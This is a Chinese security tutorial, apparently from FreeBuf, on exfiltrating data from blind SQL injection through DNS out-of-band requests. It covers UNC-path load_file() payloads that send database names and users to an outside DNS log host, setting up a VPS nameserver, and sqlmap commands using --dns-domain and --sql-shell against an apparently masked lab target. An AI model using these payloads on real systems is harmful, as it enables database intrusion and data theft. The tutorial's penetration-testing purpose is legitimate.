## 一、概述与使用场景

### 1.1为什么写这篇文章？

在一次注入过程中，发现目标站点存在“基于时间的SQL盲注漏洞”。然而在注入过程中即使网络条件不错、用了sqlmap神器，然而一顿饭的时间过去了连表名竟然都还没注完，效率让人十分崩溃。

后面又使用OOB（out of
band）带外通信技术，结合DNSlog平台进行手注。速度是略微有点提高，但是还是觉得应该有更好的自动化方法。网上找了很多文章，感觉都是讲了一点就刹住了，照着文章复现也是坑多多。不过自己最后还是走完了所有的坑。通过sqlmap神器通过OOB
把漫长几个小时的盲注的时间，缩短到了几秒。

这篇文章就是把这些东西记录下来，并将具体的实现过程详细步骤分享给大家。我肯定还是有理解不到位的地方，希望师傅们多多提一些建设性的建议和指导。

### 1.2阅读建议

建议大小师傅们都先从第三、四部分看起，我的学习观点是先Know how，再Know why。可以先跟着我的步骤复现成功，再回过头认真理解原理。

### 1.3使用场景

> （1）存在注入点，然而无回显。可能被waf拦截了，仅能通过盲注等方式获取目标数据，然而表和字段数据特别多，直接进行盲注太过漫长。
>
> （2）即使无法直连外网，但是DNS请求可达外网。
>
> （3）能够引发DNS查询请求的数据库函数需要被开启，例如MySQL的load_file()函数。
>
> （4）本文是Windows主机搭建的网站中实现注入，Linux暂未实现。

## 二、前置知识点原理

### 2.1 UNC路径讲解

UNC (Universal Naming Convention)
/通用命名规则，也叫通用命名规范、通用命名约定，一般Windows主机默认存在，Linux主机默认不存在。格式：\\\servername\sharename，其中servername是服务器名。sharename是共享资源的名称。

我们平时使用的打印机、网络共享文件夹时，都会用到UNC填写地址。并且当我们在使用UNC路径时，是会对域名进行DNS查询。比如我在运行中输入\\\[www.freebuf.com](http://www.freebuf.com/)，用wireshark抓DNS包进行分析，可以看到确实存在对[www.freebuf.com](http://www.freebuf.com/)这个域名进行DNS请求的流量，如下图所示：

![](https://image.3001.net/images/20191216/1576479440_5df72ad024c94.png!small)

![](https://image.3001.net/images/20191216/1576479531_5df72b2bd54c3.png!small)

### 2.2 DNS迭代查询原理

首先需要有一个可以配置的域名，比如在本文第3部分《3. 阿里云主机与DNS解析配置》购买的域名。

然后通过代理商（本文是使用阿里云）设置域名fuzi666.xyz 的 nameserver 为自己的VPS服务器 A，然后在VPS服务器 A 上配置好
DNS Server。

这样以来所有 fuzi666.xyz 及其子域名的查询都会到 服务器 A 上。这时你在VPS服务器A上就能够实时地监控dns查询请求了，图示如下。

![](https://image.3001.net/images/20191216/1576479605_5df72b75b0518.png!small)

### 2.3 OOB原理

OOB，英文全称是out of band，中文：带外通信。理解OOB之前要知道SQLi可分为三个独立的类别：inband, inference（推理）
和out-of-band。

Inband一般是报错注入、union联合注入等注入类型，他们可以在页面中回显或提供直接的报错显示，是最快和最方便的注入方式。inference一般又叫盲注，可以通过布尔判断、时间延迟等进行注入，无法直接获取页面显示耗时较长。

我们在平时渗透中，如果执行的sql注入均无回显（可能安全设备将回显进行了监控和阻断），这个时候可以利用结合前文2.1和2.2中的知识进行OOB带外通信，数据库oob具体实现如下几个方式

方式一：自定义字符串信息带出。

拼接到UNC路径中发起一个DNS请求，sql语句如下：

    
    
    selectload_file('\\\\mygod.kccj9o.dnslog.cn\\111');

![](https://image.3001.net/images/20191216/1576479688_5df72bc8f37f8.png!small)

查看DNSlog的回显，已经将我们自定义的字段带了出来，如下图：

![](https://image.3001.net/images/20191216/1576479720_5df72be876a8b.png!small)

方式二：将当前数据库名带出来。

sql语句如下：

    
    
    select load_file(concat('\\\\', database(),'.pz3vky.dnslog.cn\\111'));

![](https://image.3001.net/images/20191216/1576479798_5df72c36275f5.png!small)

查看DNSlog的回显，已经将我们想要查询的数据库名“security“带了出来，如下图：

![](https://image.3001.net/images/20191216/1576479832_5df72c58833b1.png!small)

方式三：将存在特殊字符的数据带出来。

这时会出现当发起的dns请求中存在特殊字符时，dns请求无法完成。看一下域名的规则是可以包含英文字母（a-z，26个）、数字（0-9，10个），以及半角的连接符“-”（即中横线），不能使用空格及特殊字符（如！、$、&、?等）；

因此我们为了保证发起的DNS请求中只存在字母和数字，需要将字符串进行编码，这里推荐使用hex()函数16进制编码。具体实现的sql语句如下：

    
    
    select load_file(concat('\\\\', hex(user()),'.pz3vky.dnslog.cn\\111'));

![](https://image.3001.net/images/20191216/1576479897_5df72c998b849.png!small)

查看DNSlog的回显，已经将我们想要查询的数据库名的16进制带了出来，如下图：

![](https://image.3001.net/images/20191216/1576479944_5df72cc802412.png!small)

将16进制转化为文本后，得到用户名为“root@localhost ”

###
![](https://image.3001.net/images/20191216/1576479967_5df72cdf82663.png!small)

其他的OOB利用姿势还有很多，上面我也只是做了简单介绍。目的是为后面利用sqlmap时，便于理解。打一个理论基础，详细内容可以看看文末参考资料中的文章继续研究。

## 三、阿里云主机与DNS解析配置

### 3.1 VPS和域名准备

第一步：登录阿里云，搜索并进入“注册域名”

![](https://image.3001.net/images/20191216/1576480009_5df72d0909419.png!small)

第二步：选择想要的域名，并且购买。最便宜的也就5块钱一年，这里假定我们购买了fuzi666.xyz这个域名，后文中都会用此域名作为示例。

![](https://image.3001.net/images/20191216/1576480042_5df72d2a65597.png!small)

第三步：购买后的实名认证不再赘述，一般认证后要等待几个小时才会生效，下图是域名生效后的控制台截图：

![](https://image.3001.net/images/20191216/1576480190_5df72dbe291c8.jpg!small)

第四步：接下来购买VPS，这里购买一个1核1G的Ubuntu主机，假定IP为114.114.123.120。

![](https://image.3001.net/images/20191216/1576480254_5df72dfeb0d77.png!small)

### 3.2配置DNS解析

第一步：登录阿里云，进入控制台

![](https://image.3001.net/images/20191216/1576480365_5df72e6def293.png!small)

第二步：点击域名，进入域名配置页面

![](https://image.3001.net/images/20191216/1576480404_5df72e94da2af.png!small)

第三步：点击DNS修改

![](https://image.3001.net/images/20191216/1576480429_5df72ead850d0.png!small)

第四步：填写并确认

![](https://image.3001.net/images/20191216/1576480455_5df72ec78ef8c.png!small)

第五步：返回查看是否配置成功，当出现以下为ns1.fuzi666.zyx和ns2.fuzi666.zyx即正确。

![](https://image.3001.net/images/20191216/1576480478_5df72ede5ff09.png!small)

第六步：自定义DNS Host

![](https://image.3001.net/images/20191216/1576480505_5df72ef938aaa.png!small)

第七步：填写自定义DNS Host中的内容，IP为VPS的IP，之后点击保存。示例内容如图：

![](https://image.3001.net/images/20191216/1576480528_5df72f106599f.png!small)

第八步：填写正确后，如下图所示：

![](https://image.3001.net/images/20191216/1576480553_5df72f29eacc9.png!small)

第九步：返回域名列表，点击解析

![](https://image.3001.net/images/20191216/1576480577_5df72f417142a.png!small)

第十步：添加记录

![](https://image.3001.net/images/20191216/1576480604_5df72f5c5bf4f.png!small)

第十一步：填写内容，将ns1和ns2和*都分别添加上：

![](https://image.3001.net/images/20191216/1576480627_5df72f731cef4.png!small)

第十二步：检查是否正常。可能需要等待一会儿，状态才会变成正常。当显示正常，则完成了域名的解析配置。

![](https://image.3001.net/images/20191216/1576480652_5df72f8c81017.png!small)

第十三步：测试能否在VPS上检测能够收到DNS解析请求信息，命令：tcpdump –n port 53

![](https://image.3001.net/images/20191216/1576480676_5df72fa458125.png!small)

第十四步：在本地主机ping一下域名，在vps上可以收到DNS请求：

![](https://image.3001.net/images/20191216/1576480703_5df72fbf4ad53.png!small)

第十五步：故障排查

如果无法正常收到DNS请求，那么可能是防火墙策略。关闭Ubuntu防火墙的命令是：sudoufwdisable

也可能是或者VPS上存在安全策略阻塞，再去VPS控制台上检测是否存在安全组策略，全部放通即可。例如华为VPS默认只开发部分端口，手动勾选全部放通即可。

![](https://image.3001.net/images/20191216/1576480752_5df72ff0d3284.png!small)

## 四、使用sqlmap利用OOB技术快速突破盲注

### 4.1 VPS上python环境的安装

一般vps均自带python2的环境，因此python2的环境不需要再次安装。在114.114.123.120中安装sqlmap，sqlmap的安装命令为：
git clonegit://github.com/sqlmapproject/sqlmap.git，安装好后，进入sqlmap目录，并执行python
sqlmap.py，看能够正常回显即可正常使用sqlmap

![](https://image.3001.net/images/20191216/1576480918_5df730962c8c6.png!small)

### 4.2与盲注的时间对比

sqlmap指定使用时间盲注方式注入，并读取当前数据库名的命令如下：

    
    
    python sqlmap.py -u "<http://qq.xxxxxx.com/Less-9/?id=1>"--tech=T --dbms=mysql --current-db --batch

先演示使用传统的sqlmap时间盲注，8个字母耗时1分46秒，如下图所示。

![](https://image.3001.net/images/20191216/1576480943_5df730afb6400.png!small)

再使用基于DNS的OOB技术进行注入，为了避免作弊，首先要清除上一次sql注入的缓存。缓存文件位置和清除命令如下：

![](https://image.3001.net/images/20191216/1576480968_5df730c89a796.png!small)

接着使用本文介绍的sqlmap基于dns通道进行OOB注入，仅仅耗时1秒，执行时间盲注的命令如下：

    
    
    python sqlmap.py -u "<http://qq.xxxxxx.com/Less-9/?id=1>"--tech=T --dbms=mysql --dns-domain=fuzi666.xyz --current-db –batch

![](https://image.3001.net/images/20191216/1576481026_5df73102f197c.png!small)

### 4.3利用sql-shell快速获取数据

弹个sql-shell回来：

    
    
    python sqlmap.py -u "<http://qq.xxxxxx.com/Less-9/?id=1>"--tech=T --dbms=mysql --dns-domain=13fuzi.com --sql-shell --batch

![](https://image.3001.net/images/20191216/1576482477_5df736ad655b9.png!small)

查询数据库名，耗时4秒。查询数据库名的sql语句如下：

    
    
    select schema_name frominformation_schema.schemata;

![](https://image.3001.net/images/20191216/1576482514_5df736d25c65f.png!small)

## 参考资料：

> <https://www.cnblogs.com/backlion/p/8984121.html>
>
> <https://www.freebuf.com/column/184587.html>
>
> <https://www.cnblogs.com/afanti/p/8047530.html>

***本文原创作者：十三夫子13fuzi，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

